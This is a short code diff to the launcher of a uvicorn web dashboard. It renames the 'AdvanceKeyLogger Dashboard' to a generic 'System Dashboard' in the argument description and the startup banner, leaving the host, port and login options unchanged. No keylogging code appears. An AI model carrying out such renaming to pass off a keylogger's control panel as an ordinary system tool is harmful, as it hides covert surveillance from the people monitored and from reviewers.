@@ -11,7 +11,7 @@ sys.path.insert(0, str(Path(__file__).parent.parent))
 
 
 def main() -> None:
-    parser = argparse.ArgumentParser(description="AdvanceKeyLogger Dashboard")
+    parser = argparse.ArgumentParser(description="System Dashboard")
     parser.add_argument("--host", default="127.0.0.1", help="Bind host (default: 127.0.0.1)")
     parser.add_argument("--port", type=int, default=8080, help="Bind port (default: 8080)")
     parser.add_argument("--reload", action="store_true", help="Auto-reload on code changes")
@@ -65,7 +65,7 @@ def main() -> None:
 
     import uvicorn
 
-    print(f"\n  AdvanceKeyLogger Dashboard")
+    print(f"\n  System Dashboard")
     print(f"  Running on http://{args.host}:{args.port}")
     print(f"  Login: {args.admin_user} / {'*' * len(args.admin_pass)}")
     print(f"  API docs: http://{args.host}:{args.port}/api/docs")
